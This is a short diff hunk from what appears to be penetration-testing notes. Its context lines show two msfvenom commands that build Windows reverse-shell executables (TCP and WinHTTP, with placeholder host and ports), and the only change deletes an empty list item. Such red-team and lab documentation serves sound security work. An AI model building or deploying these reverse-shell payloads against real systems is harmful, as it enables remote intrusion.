@@ -183,4 +183,3 @@ msfvenom -p windows/x64/custom/reverse_tcp lhost=LHOST lport=<port3> -f exe -o t
 msfvenom -p windows/x64/custom/reverse_winhttp lhost=LHOST lport=<port2> LURI=/path.woff -f exe -o http.exe
 ```
 
-5. 
